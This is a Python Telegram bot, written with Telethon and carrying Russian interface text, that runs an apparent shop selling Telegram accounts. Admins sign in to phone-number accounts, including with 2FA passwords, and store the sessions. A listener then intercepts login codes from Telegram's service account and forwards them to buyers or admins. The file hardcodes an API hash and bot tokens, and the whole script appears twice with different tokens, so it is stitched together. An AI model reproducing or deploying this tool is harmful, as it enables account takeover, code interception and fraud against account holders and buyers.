import asyncio
import re
import os
import json
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError

# ================= НАСТРОЙКИ =================
API_ID = 28990846
API_HASH = "28962aebadaffac1b652586caa07fad9"
# ОБНОВЛЕННЫЙ ТОКЕН
BOT_TOKEN = "7994467782:AAFwm088BXgYibEJghZSITNpShtoMMcX55I"

ADMINS = [5363964315, 8365707633] 
MANAGER_USER = "@Backdrop_v_1889"
# =============================================
import asyncio
import re
import os
import json
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError

# ================= НАСТРОЙКИ =================
API_ID = 28990846
API_HASH = "28962aebadaffac1b652586caa07fad9"
# ОБНОВЛЕННЫЙ ТОКЕН
BOT_TOKEN = "8286769256:AAG22ZIdvbMigtIhlQJig5vC_gTO_KemVU0"

ADMINS = [5363964315, 8365707633] 
MANAGER_USER = "@Backdrop_v_1889 или @devmaks_tg"
# =============================================

bot = TelegramClient('admin_bot_session', API_ID, API_HASH, timeout=30).start(bot_token=BOT_TOKEN)

user_sessions = {}      
active_user_clients = {} 
captured_codes = {}     
db = {"users": {}, "purchases": {}}

DB_FILE = "database.json"
SESSIONS_DIR = "sessions"

if not os.path.exists(SESSIONS_DIR):
    os.makedirs(SESSIONS_DIR)

# --- РАБОТА С БАЗОЙ ДАННЫХ ---

def load_db():
    global db
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r", encoding="utf-8") as f:
            try: db = json.load(f)
            except: db = {"users": {}, "purchases": {}}
    else: db = {"users": {}, "purchases": {}}

def save_db():
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(db, f, ensure_ascii=False, indent=4)

def register_user(uid, username):
    uid = str(uid)
    username = (username or "Скрыт").lower().replace("@", "")
    if uid not in db["users"]:
        db["users"][uid] = {"username": username, "phones": []}
    else:
        db["users"][uid]["username"] = username
    save_db()

# --- КЛАВИАТУРЫ ---

def get_admin_kb():
    return [
        [Button.text("➕ Добавить номер", resize=True), Button.text("💰 Продать номер")],
        [Button.text("⛔ Забрать номер"), Button.text("📊 Статус")],
        [Button.text("📩 Все коды")]
    ]

def get_cancel_kb():
    return [[Button.text("❌ Отмена", resize=True)]]

def get_user_kb():
    return [[Button.text("🛒 Купить номер", resize=True)], [Button.text("🔑 Получить код")]]

def get_digit_kb():
    rows = []
    nums = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]
    row = []
    for n in nums:
        row.append(Button.inline(n, data=f"num_{n}"))
        if len(row) == 3:
            rows.append(row); row = []
    rows.append([Button.inline("⬅️ Стереть", data="num_del"), Button.inline("0", data="num_0"), Button.inline("✅ Готово", data="num_done")])
    rows.append([Button.inline("❌ Отменить процесс", data="num_cancel")])
    return rows

# --- ЛОГИКА ПРОСЛУШКИ ---

async def start_listening(phone, client):
    if phone in active_user_clients: return
    active_user_clients[phone] = client
    
    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        match = re.search(r'\b(\d{5})\b', event.raw_text)
        if match:
            code = match.group(1)
            captured_codes[phone] = code
            buyer_id = db["purchases"].get(phone)
            if buyer_id:
                try:
                    msg = (f"📩 <b>ПОЛУЧЕН НОВЫЙ КОД!</b>\n"
                           f"━━━━━━━━━━━━━━\n"
                           f"📱 Номер: <code>{phone}</code>\n"
                           f"🔑 Код: <code>{code}</code>\n"
                           f"━━━━━━━━━━━━━━")
                    await bot.send_message(int(buyer_id), msg, parse_mode="html")
                except: pass
            else:
                for adm in ADMINS:
                    try:
                        msg = (f"🔔 <b>ПЕРЕХВАТ (Свободный)</b>\n"
                               f"📱 Номер: <code>{phone}</code>\n"
                               f"🔑 Код: <code>{code}</code>")
                        await bot.send_message(adm, msg, parse_mode="html")
                    except: pass
    
    print(f"[*] Прослушка {phone} активна")
    try: await client.run_until_disconnected()
    except: active_user_clients.pop(phone, None)

# --- ГЛОБАЛЬНЫЙ ОБРАБОТЧИК ---

@bot.on(events.NewMessage)
async def global_handler(event):
    uid = event.sender_id
    text = event.text
    if not text: return
    
    register_user(uid, event.sender.username)
    is_admin = uid in ADMINS

    # Отмена
    if text == "❌ Отмена" and is_admin:
        if uid in user_sessions:
            data = user_sessions.pop(uid)
            if 'client' in data:
                try: await data['client'].disconnect()
                except: pass
        await event.respond("🔘 <b>Действие отменено.</b>", buttons=get_admin_kb(), parse_mode="html")
        return

    if text == "/start":
        if is_admin:
            await event.respond("🛡️ <b>ПАНЕЛЬ АДМИНИСТРАТОРА</b>", buttons=get_admin_kb(), parse_mode="html")
        else:
            await event.respond("👋 <b>Добро пожаловать в магазин аккаунтов!</b>", buttons=get_user_kb(), parse_mode="html")
        return

    # ПОЛЬЗОВАТЕЛЬ
    if not is_admin:
        if text == "🛒 Купить номер":
            msg = (f"💳 <b>АКТУАЛЬНЫЙ ПРАЙС-ЛИСТ</b>\n"
                   f"━━━━━━━━━━━━━━\n"
                   f"🇺🇸 <b>США</b> (+1) ➔ <code>100 ₽</code>\n"
                   f"🇲🇲 <b>Мьянма</b> (+95) ➔ <code>100 ₽</code>\n"
                   f"🇮🇳 <b>Индия</b> (+91) ➔ <code>119 ₽</code>\n"
                   f"━━━━━━━━━━━━━━\n"
                   f"✉️ Для покупки: {MANAGER_USER}")
            await event.respond(msg, parse_mode="html")
        elif text == "🔑 Получить код":
            user_phones = db["users"].get(str(uid), {}).get("phones", [])
            if not user_phones:
                await event.respond("❌ <b>У вас нет активных номеров.</b>", parse_mode="html")
                return
            if len(user_phones) == 1:
                await event.respond(f"📱 <b>Номер:</b> <code>{user_phones[0]}</code>\n🛰 <b>Статус:</b> <code>Ожидание кода...</code>", parse_mode="html")
            else:
                buttons = [[Button.inline(f"📱 {p}", data=f"ucheck_{p}")] for p in user_phones]
                await event.respond("🔘 <b>Выберите номер для мониторинга:</b>", buttons=buttons, parse_mode="html")
        return

    # АДМИН
    if is_admin:
        if uid in user_sessions:
            state = user_sessions[uid].get('state')
            if state == 'wait_password': await process_password(event); return
            elif state == 'wait_buyer': await finalize_sale(event); return

        if text == "➕ Добавить номер": await start_add_number(event)
        elif text == "💰 Продать номер":
            free_phones = [p for p in active_user_clients.keys() if p not in db["purchases"]]
            if not free_phones:
                await event.respond("⚠ <b>Нет свободных номеров.</b>", parse_mode="html")
                return
            buttons = [[Button.inline(f"📱 {p}", data=f"sell_{p}")] for p in free_phones]
            await event.respond("💰 <b>ВЫБЕРИТЕ НОМЕР:</b>", buttons=buttons, parse_mode="html")
        elif text == "⛔ Забрать номер":
            sold_phones = list(db["purchases"].keys())
            if not sold_phones:
                await event.respond("⚠ <b>Проданные номера отсутствуют.</b>", parse_mode="html")
                return
            buttons = [[Button.inline(f"⛔ Забрать {p}", data=f"rev_{p}")] for p in sold_phones]
            await event.respond("⛔ <b>ВЫБЕРИТЕ НОМЕР ДЛЯ ОТЗЫВА:</b>", buttons=buttons, parse_mode="html")
        elif text == "📊 Статус":
            txt = "📊 <b>ОТЧЕТ ПО СИСТЕМЕ</b>\n━━━━━━━━━━━━━━\n"
            for p in active_user_clients.keys():
                owner_id = db["purchases"].get(p)
                status = f"👤 @{db['users'].get(str(owner_id), {}).get('username', '??')}" if owner_id else "🟢 Свободен"
                txt += f"📱 <code>{p}</code> ➔ {status}\n"
            await event.respond(txt if active_user_clients else "📭 Пусто.", parse_mode="html")
        elif text == "📩 Все коды":
            if not captured_codes: await event.respond("📭 <b>Кодов нет.</b>", parse_mode="html")
            else:
                t = "📩 <b>ЖУРНАЛ КОДОВ</b>\n━━━━━━━━━━━━━━\n"
                for p, c in captured_codes.items(): t += f"📱 <code>{p}</code> ➔ <b>{c}</b>\n"
                await event.respond(t, parse_mode="html")

# --- CALLBACKS ---

@bot.on(events.CallbackQuery(data=re.compile(b"num_cancel")))
async def cancel_callback(event):
    uid = event.sender_id
    if uid in user_sessions:
        data = user_sessions.pop(uid)
        if 'client' in data:
            try: await data['client'].disconnect()
            except: pass
    await event.edit("🔘 <b>Процесс отменен.</b>", parse_mode="html")
    await event.respond("Главное меню:", buttons=get_admin_kb())

@bot.on(events.CallbackQuery(data=re.compile(b"ucheck_")))
async def user_check_callback(event):
    phone = event.data.decode().split('_')[1]
    user_phones = db["users"].get(str(event.sender_id), {}).get("phones", [])
    if phone in user_phones:
        await event.edit(f"📱 <b>Номер:</b> <code>{phone}</code>\n🛰 <b>Статус:</b> <code>Активен</code>\n\n🔍 <b>Ожидаю код...</b>", parse_mode="html")
    else: await event.answer("❌ Ошибка доступа", alert=True)

@bot.on(events.CallbackQuery(data=re.compile(b"rev_")))
async def revoke_callback(event):
    if event.sender_id not in ADMINS: return
    phone = event.data.decode().split('_')[1]
    if phone in db["purchases"]:
        owner_id = str(db["purchases"].pop(phone))
        if phone in db["users"].get(owner_id, {}).get("phones", []):
            db["users"][owner_id]["phones"].remove(phone)
        save_db()
        await event.edit(f"✅ <b>Номер {phone} отозван!</b>", parse_mode="html")
        try: await bot.send_message(int(owner_id), f"⚠️ Доступ к номеру <code>{phone}</code> отозван.", parse_mode="html")
        except: pass

@bot.on(events.CallbackQuery(data=re.compile(b"sell_")))
async def sell_callback(event):
    if event.sender_id not in ADMINS: return
    phone = event.data.decode().split('_')[1]
    user_sessions[event.sender_id] = {'state': 'wait_buyer', 'sell_phone': phone}
    await event.respond("🛠 <b>Режим продажи</b>", buttons=get_cancel_kb(), parse_mode="html")
    await event.edit(f"📱 <b>Продажа:</b> <code>{phone}</code>\n\nВведите <b>Username</b> покупателя (без @):", parse_mode="html")

async def finalize_sale(event):
    uid = event.sender_id
    data = user_sessions.get(uid)
    buyer_username = event.text.strip().lower().replace("@", "")
    phone = data['sell_phone']
    target_uid = next((u_id for u_id, info in db["users"].items() if info["username"] == buyer_username), None)
    
    if target_uid:
        db["purchases"][phone] = int(target_uid)
        if phone not in db["users"][target_uid]["phones"]: db["users"][target_uid]["phones"].append(phone)
        save_db()
        user_sessions.pop(uid, None)
        await event.respond(f"✅ <b>Номер {phone} передан @{buyer_username}</b>", buttons=get_admin_kb(), parse_mode="html")
        try: await bot.send_message(int(target_uid), "🎁 <b>Покупка подтверждена!</b>\n\nИспользуйте кнопку получения кода.", buttons=get_user_kb(), parse_mode="html")
        except: pass
    else: await event.respond(f"❌ <b>Юзер @{buyer_username} не найден.</b>", parse_mode="html")

# --- ВХОД ---

async def start_add_number(event):
    uid = event.sender_id
    async with bot.conversation(uid) as conv:
        await conv.send_message("⌨️ <b>Введите номер (с +):</b>", buttons=get_cancel_kb(), parse_mode="html")
        p_msg = await conv.get_response()
        if p_msg.text == "❌ Отмена": return
        phone = p_msg.text.strip().replace(" ", "")
        status_msg = await event.respond(f"📡 <b>Связь с {phone}...</b>", parse_mode="html")
        client = TelegramClient(f"{SESSIONS_DIR}/{phone}", API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            try:
                sent = await client.send_code_request(phone)
                user_sessions[uid] = {'phone': phone, 'client': client, 'hash': sent.phone_code_hash, 'code': '', 'state': 'wait_code', 'msg_id': status_msg.id}
                await bot.edit_message(uid, status_msg.id, f"🔢 <b>Номер:</b> <code>{phone}</code>\nВведите код:", buttons=get_digit_kb(), parse_mode="html")
            except Exception as e: await event.respond(f"❌ <b>Ошибка:</b> {e}", buttons=get_admin_kb(), parse_mode="html"); await client.disconnect()
        else:
            await event.respond(f"✅ <b>Уже в системе!</b>", buttons=get_admin_kb(), parse_mode="html"); asyncio.create_task(start_listening(phone, client))

@bot.on(events.CallbackQuery(data=re.compile(b"num_")))
async def num_kb_handler(event):
    uid = event.sender_id
    data = user_sessions.get(uid)
    if not data or data.get('state') != 'wait_code': return
    await event.answer()
    cmd = event.data.decode().split('_')[1]
    if cmd == "del": data['code'] = data['code'][:-1]
    elif cmd == "done" or len(data['code']) == 5:
        if len(data['code']) == 5 or cmd == "done":
            await event.edit("⌛ <b>Проверка...</b>", parse_mode="html")
            try:
                await data['client'].sign_in(data['phone'], data['code'], phone_code_hash=data['hash'])
                await event.respond(f"✅ <b>Номер {data['phone']} добавлен!</b>", buttons=get_admin_kb(), parse_mode="html")
                asyncio.create_task(start_listening(data['phone'], data['client']))
                user_sessions.pop(uid, None)
            except SessionPasswordNeededError:
                data['state'] = 'wait_password'
                await event.respond("🔐 <b>Аккаунт защищен 2FA!</b>\nВведите пароль текстом:", buttons=get_cancel_kb(), parse_mode="html")
            except Exception as e: await event.respond(f"❌ <b>Ошибка:</b> {e}", buttons=get_admin_kb(), parse_mode="html"); user_sessions.pop(uid, None)
    else:
        if len(data['code']) < 5: data['code'] += cmd
    mask = " ".join(list(data['code'])) + " _" * (5 - len(data['code']))
    await event.edit(f"🔢 <b>Код:</b> <code>{mask}</code>", buttons=get_digit_kb(), parse_mode="html")

async def process_password(event):
    uid = event.sender_id
    data = user_sessions.get(uid)
    try:
        await data['client'].sign_in(password=event.text.strip())
        await event.respond(f"✅ <b>Успешно подключен!</b>", buttons=get_admin_kb(), parse_mode="html"); asyncio.create_task(start_listening(data['phone'], data['client']))
        user_sessions.pop(uid, None)
    except Exception as e: await event.respond(f"❌ <b>Ошибка:</b> {e}", parse_mode="html")

# --- ЗАПУСК ---
async def main():
    load_db()
    print("--- СЕРВЕР ЗАПУЩЕН ---")
    if os.path.exists(SESSIONS_DIR):
        for f in os.listdir(SESSIONS_DIR):
            if f.endswith(".session") and "admin_bot" not in f:
                phone = f.replace(".session", "")
                c = TelegramClient(f"{SESSIONS_DIR}/{phone}", API_ID, API_HASH)
                try:
                    await c.connect()
                    if await c.is_user_authorized(): asyncio.create_task(start_listening(phone, c))
                except: pass
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.get_event_loop().run_until_complete(main())

bot = TelegramClient('admin_bot_session', API_ID, API_HASH, timeout=30).start(bot_token=BOT_TOKEN)

user_sessions = {}      
active_user_clients = {} 
captured_codes = {}     
db = {"users": {}, "purchases": {}}

DB_FILE = "database.json"
SESSIONS_DIR = "sessions"

if not os.path.exists(SESSIONS_DIR):
    os.makedirs(SESSIONS_DIR)

# --- РАБОТА С БАЗОЙ ДАННЫХ ---

def load_db():
    global db
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r", encoding="utf-8") as f:
            try: db = json.load(f)
            except: db = {"users": {}, "purchases": {}}
    else: db = {"users": {}, "purchases": {}}

def save_db():
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(db, f, ensure_ascii=False, indent=4)

def register_user(uid, username):
    uid = str(uid)
    username = (username or "Скрыт").lower().replace("@", "")
    if uid not in db["users"]:
        db["users"][uid] = {"username": username, "phones": []}
    else:
        db["users"][uid]["username"] = username
    save_db()

# --- КЛАВИАТУРЫ ---

def get_admin_kb():
    return [
        [Button.text("➕ Добавить номер", resize=True), Button.text("💰 Продать номер")],
        [Button.text("⛔ Забрать номер"), Button.text("📊 Статус")],
        [Button.text("📩 Все коды")]
    ]

def get_cancel_kb():
    return [[Button.text("❌ Отмена", resize=True)]]

def get_user_kb():
    return [[Button.text("🛒 Купить номер", resize=True)], [Button.text("🔑 Получить код")]]

def get_digit_kb():
    rows = []
    nums = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]
    row = []
    for n in nums:
        row.append(Button.inline(n, data=f"num_{n}"))
        if len(row) == 3:
            rows.append(row); row = []
    rows.append([Button.inline("⬅️ Стереть", data="num_del"), Button.inline("0", data="num_0"), Button.inline("✅ Готово", data="num_done")])
    rows.append([Button.inline("❌ Отменить процесс", data="num_cancel")])
    return rows

# --- ЛОГИКА ПРОСЛУШКИ ---

async def start_listening(phone, client):
    if phone in active_user_clients: return
    active_user_clients[phone] = client
    
    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        match = re.search(r'\b(\d{5})\b', event.raw_text)
        if match:
            code = match.group(1)
            captured_codes[phone] = code
            buyer_id = db["purchases"].get(phone)
            if buyer_id:
                try:
                    msg = (f"📩 <b>ПОЛУЧЕН НОВЫЙ КОД!</b>\n"
                           f"━━━━━━━━━━━━━━\n"
                           f"📱 Номер: <code>{phone}</code>\n"
                           f"🔑 Код: <code>{code}</code>\n"
                           f"━━━━━━━━━━━━━━")
                    await bot.send_message(int(buyer_id), msg, parse_mode="html")
                except: pass
            else:
                for adm in ADMINS:
                    try:
                        msg = (f"🔔 <b>ПЕРЕХВАТ (Свободный)</b>\n"
                               f"📱 Номер: <code>{phone}</code>\n"
                               f"🔑 Код: <code>{code}</code>")
                        await bot.send_message(adm, msg, parse_mode="html")
                    except: pass
    
    print(f"[*] Прослушка {phone} активна")
    try: await client.run_until_disconnected()
    except: active_user_clients.pop(phone, None)

# --- ГЛОБАЛЬНЫЙ ОБРАБОТЧИК ---

@bot.on(events.NewMessage)
async def global_handler(event):
    uid = event.sender_id
    text = event.text
    if not text: return
    
    register_user(uid, event.sender.username)
    is_admin = uid in ADMINS

    # Отмена
    if text == "❌ Отмена" and is_admin:
        if uid in user_sessions:
            data = user_sessions.pop(uid)
            if 'client' in data:
                try: await data['client'].disconnect()
                except: pass
        await event.respond("🔘 <b>Действие отменено.</b>", buttons=get_admin_kb(), parse_mode="html")
        return

    if text == "/start":
        if is_admin:
            await event.respond("🛡️ <b>ПАНЕЛЬ АДМИНИСТРАТОРА</b>", buttons=get_admin_kb(), parse_mode="html")
        else:
            await event.respond("👋 <b>Добро пожаловать в магазин аккаунтов!</b>", buttons=get_user_kb(), parse_mode="html")
        return

    # ПОЛЬЗОВАТЕЛЬ
    if not is_admin:
        if text == "🛒 Купить номер":
            msg = (f"💳 <b>АКТУАЛЬНЫЙ ПРАЙС-ЛИСТ</b>\n"
                   f"━━━━━━━━━━━━━━\n"
                   f"🇺🇸 <b>США</b> (+1) ➔ <code>100 ₽</code>\n"
                   f"🇲🇲 <b>Мьянма</b> (+95) ➔ <code>100 ₽</code>\n"
                   f"🇮🇳 <b>Индия</b> (+91) ➔ <code>119 ₽</code>\n"
                   f"━━━━━━━━━━━━━━\n"
                   f"✉️ Для покупки: {MANAGER_USER}")
            await event.respond(msg, parse_mode="html")
        elif text == "🔑 Получить код":
            user_phones = db["users"].get(str(uid), {}).get("phones", [])
            if not user_phones:
                await event.respond("❌ <b>У вас нет активных номеров.</b>", parse_mode="html")
                return
            if len(user_phones) == 1:
                await event.respond(f"📱 <b>Номер:</b> <code>{user_phones[0]}</code>\n🛰 <b>Статус:</b> <code>Ожидание кода...</code>", parse_mode="html")
            else:
                buttons = [[Button.inline(f"📱 {p}", data=f"ucheck_{p}")] for p in user_phones]
                await event.respond("🔘 <b>Выберите номер для мониторинга:</b>", buttons=buttons, parse_mode="html")
        return

    # АДМИН
    if is_admin:
        if uid in user_sessions:
            state = user_sessions[uid].get('state')
            if state == 'wait_password': await process_password(event); return
            elif state == 'wait_buyer': await finalize_sale(event); return

        if text == "➕ Добавить номер": await start_add_number(event)
        elif text == "💰 Продать номер":
            free_phones = [p for p in active_user_clients.keys() if p not in db["purchases"]]
            if not free_phones:
                await event.respond("⚠ <b>Нет свободных номеров.</b>", parse_mode="html")
                return
            buttons = [[Button.inline(f"📱 {p}", data=f"sell_{p}")] for p in free_phones]
            await event.respond("💰 <b>ВЫБЕРИТЕ НОМЕР:</b>", buttons=buttons, parse_mode="html")
        elif text == "⛔ Забрать номер":
            sold_phones = list(db["purchases"].keys())
            if not sold_phones:
                await event.respond("⚠ <b>Проданные номера отсутствуют.</b>", parse_mode="html")
                return
            buttons = [[Button.inline(f"⛔ Забрать {p}", data=f"rev_{p}")] for p in sold_phones]
            await event.respond("⛔ <b>ВЫБЕРИТЕ НОМЕР ДЛЯ ОТЗЫВА:</b>", buttons=buttons, parse_mode="html")
        elif text == "📊 Статус":
            txt = "📊 <b>ОТЧЕТ ПО СИСТЕМЕ</b>\n━━━━━━━━━━━━━━\n"
            for p in active_user_clients.keys():
                owner_id = db["purchases"].get(p)
                status = f"👤 @{db['users'].get(str(owner_id), {}).get('username', '??')}" if owner_id else "🟢 Свободен"
                txt += f"📱 <code>{p}</code> ➔ {status}\n"
            await event.respond(txt if active_user_clients else "📭 Пусто.", parse_mode="html")
        elif text == "📩 Все коды":
            if not captured_codes: await event.respond("📭 <b>Кодов нет.</b>", parse_mode="html")
            else:
                t = "📩 <b>ЖУРНАЛ КОДОВ</b>\n━━━━━━━━━━━━━━\n"
                for p, c in captured_codes.items(): t += f"📱 <code>{p}</code> ➔ <b>{c}</b>\n"
                await event.respond(t, parse_mode="html")

# --- CALLBACKS ---

@bot.on(events.CallbackQuery(data=re.compile(b"num_cancel")))
async def cancel_callback(event):
    uid = event.sender_id
    if uid in user_sessions:
        data = user_sessions.pop(uid)
        if 'client' in data:
            try: await data['client'].disconnect()
            except: pass
    await event.edit("🔘 <b>Процесс отменен.</b>", parse_mode="html")
    await event.respond("Главное меню:", buttons=get_admin_kb())

@bot.on(events.CallbackQuery(data=re.compile(b"ucheck_")))
async def user_check_callback(event):
    phone = event.data.decode().split('_')[1]
    user_phones = db["users"].get(str(event.sender_id), {}).get("phones", [])
    if phone in user_phones:
        await event.edit(f"📱 <b>Номер:</b> <code>{phone}</code>\n🛰 <b>Статус:</b> <code>Активен</code>\n\n🔍 <b>Ожидаю код...</b>", parse_mode="html")
    else: await event.answer("❌ Ошибка доступа", alert=True)

@bot.on(events.CallbackQuery(data=re.compile(b"rev_")))
async def revoke_callback(event):
    if event.sender_id not in ADMINS: return
    phone = event.data.decode().split('_')[1]
    if phone in db["purchases"]:
        owner_id = str(db["purchases"].pop(phone))
        if phone in db["users"].get(owner_id, {}).get("phones", []):
            db["users"][owner_id]["phones"].remove(phone)
        save_db()
        await event.edit(f"✅ <b>Номер {phone} отозван!</b>", parse_mode="html")
        try: await bot.send_message(int(owner_id), f"⚠️ Доступ к номеру <code>{phone}</code> отозван.", parse_mode="html")
        except: pass

@bot.on(events.CallbackQuery(data=re.compile(b"sell_")))
async def sell_callback(event):
    if event.sender_id not in ADMINS: return
    phone = event.data.decode().split('_')[1]
    user_sessions[event.sender_id] = {'state': 'wait_buyer', 'sell_phone': phone}
    await event.respond("🛠 <b>Режим продажи</b>", buttons=get_cancel_kb(), parse_mode="html")
    await event.edit(f"📱 <b>Продажа:</b> <code>{phone}</code>\n\nВведите <b>Username</b> покупателя (без @):", parse_mode="html")

async def finalize_sale(event):
    uid = event.sender_id
    data = user_sessions.get(uid)
    buyer_username = event.text.strip().lower().replace("@", "")
    phone = data['sell_phone']
    target_uid = next((u_id for u_id, info in db["users"].items() if info["username"] == buyer_username), None)
    
    if target_uid:
        db["purchases"][phone] = int(target_uid)
        if phone not in db["users"][target_uid]["phones"]: db["users"][target_uid]["phones"].append(phone)
        save_db()
        user_sessions.pop(uid, None)
        await event.respond(f"✅ <b>Номер {phone} передан @{buyer_username}</b>", buttons=get_admin_kb(), parse_mode="html")
        try: await bot.send_message(int(target_uid), "🎁 <b>Покупка подтверждена!</b>\n\nИспользуйте кнопку получения кода.", buttons=get_user_kb(), parse_mode="html")
        except: pass
    else: await event.respond(f"❌ <b>Юзер @{buyer_username} не найден.</b>", parse_mode="html")

# --- ВХОД ---

async def start_add_number(event):
    uid = event.sender_id
    async with bot.conversation(uid) as conv:
        await conv.send_message("⌨️ <b>Введите номер (с +):</b>", buttons=get_cancel_kb(), parse_mode="html")
        p_msg = await conv.get_response()
        if p_msg.text == "❌ Отмена": return
        phone = p_msg.text.strip().replace(" ", "")
        status_msg = await event.respond(f"📡 <b>Связь с {phone}...</b>", parse_mode="html")
        client = TelegramClient(f"{SESSIONS_DIR}/{phone}", API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            try:
                sent = await client.send_code_request(phone)
                user_sessions[uid] = {'phone': phone, 'client': client, 'hash': sent.phone_code_hash, 'code': '', 'state': 'wait_code', 'msg_id': status_msg.id}
                await bot.edit_message(uid, status_msg.id, f"🔢 <b>Номер:</b> <code>{phone}</code>\nВведите код:", buttons=get_digit_kb(), parse_mode="html")
            except Exception as e: await event.respond(f"❌ <b>Ошибка:</b> {e}", buttons=get_admin_kb(), parse_mode="html"); await client.disconnect()
        else:
            await event.respond(f"✅ <b>Уже в системе!</b>", buttons=get_admin_kb(), parse_mode="html"); asyncio.create_task(start_listening(phone, client))

@bot.on(events.CallbackQuery(data=re.compile(b"num_")))
async def num_kb_handler(event):
    uid = event.sender_id
    data = user_sessions.get(uid)
    if not data or data.get('state') != 'wait_code': return
    await event.answer()
    cmd = event.data.decode().split('_')[1]
    if cmd == "del": data['code'] = data['code'][:-1]
    elif cmd == "done" or len(data['code']) == 5:
        if len(data['code']) == 5 or cmd == "done":
            await event.edit("⌛ <b>Проверка...</b>", parse_mode="html")
            try:
                await data['client'].sign_in(data['phone'], data['code'], phone_code_hash=data['hash'])
                await event.respond(f"✅ <b>Номер {data['phone']} добавлен!</b>", buttons=get_admin_kb(), parse_mode="html")
                asyncio.create_task(start_listening(data['phone'], data['client']))
                user_sessions.pop(uid, None)
            except SessionPasswordNeededError:
                data['state'] = 'wait_password'
                await event.respond("🔐 <b>Аккаунт защищен 2FA!</b>\nВведите пароль текстом:", buttons=get_cancel_kb(), parse_mode="html")
            except Exception as e: await event.respond(f"❌ <b>Ошибка:</b> {e}", buttons=get_admin_kb(), parse_mode="html"); user_sessions.pop(uid, None)
    else:
        if len(data['code']) < 5: data['code'] += cmd
    mask = " ".join(list(data['code'])) + " _" * (5 - len(data['code']))
    await event.edit(f"🔢 <b>Код:</b> <code>{mask}</code>", buttons=get_digit_kb(), parse_mode="html")

async def process_password(event):
    uid = event.sender_id
    data = user_sessions.get(uid)
    try:
        await data['client'].sign_in(password=event.text.strip())
        await event.respond(f"✅ <b>Успешно подключен!</b>", buttons=get_admin_kb(), parse_mode="html"); asyncio.create_task(start_listening(data['phone'], data['client']))
        user_sessions.pop(uid, None)
    except Exception as e: await event.respond(f"❌ <b>Ошибка:</b> {e}", parse_mode="html")

# --- ЗАПУСК ---
async def main():
    load_db()
    print("--- СЕРВЕР ЗАПУЩЕН ---")
    if os.path.exists(SESSIONS_DIR):
        for f in os.listdir(SESSIONS_DIR):
            if f.endswith(".session") and "admin_bot" not in f:
                phone = f.replace(".session", "")
                c = TelegramClient(f"{SESSIONS_DIR}/{phone}", API_ID, API_HASH)
                try:
                    await c.connect()
                    if await c.is_user_authorized(): asyncio.create_task(start_listening(phone, c))
                except: pass
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.get_event_loop().run_until_complete(main())